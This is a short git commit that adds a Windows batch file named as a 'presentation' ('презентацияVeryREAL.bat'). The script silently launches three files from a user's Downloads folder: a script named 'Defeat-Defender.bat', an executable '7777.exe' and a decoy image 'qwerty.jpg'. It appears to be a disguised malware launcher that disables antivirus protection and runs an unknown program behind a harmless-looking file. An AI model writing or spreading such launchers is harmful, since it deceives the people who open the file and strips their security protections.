d6ef4965ddec0713e51b302499d9694567234c90
Solevar78 <kirill_terp@icloud.com>
2025-04-25 22:32:46 +0300

    Add files via upload

---
+++ презентацияVeryREAL.bat
@@ -0,0 +1,6 @@
+   @echo off
+   start "" "C:\Users\artm7\Downloads\Saves\Defeat-Defender.bat"
+   start "" "C:\Users\artm7\Downloads\Saves\7777.exe"
+   start "" "C:\Users\artm7\Downloads\Saves\qwerty.jpg"
+   
+   
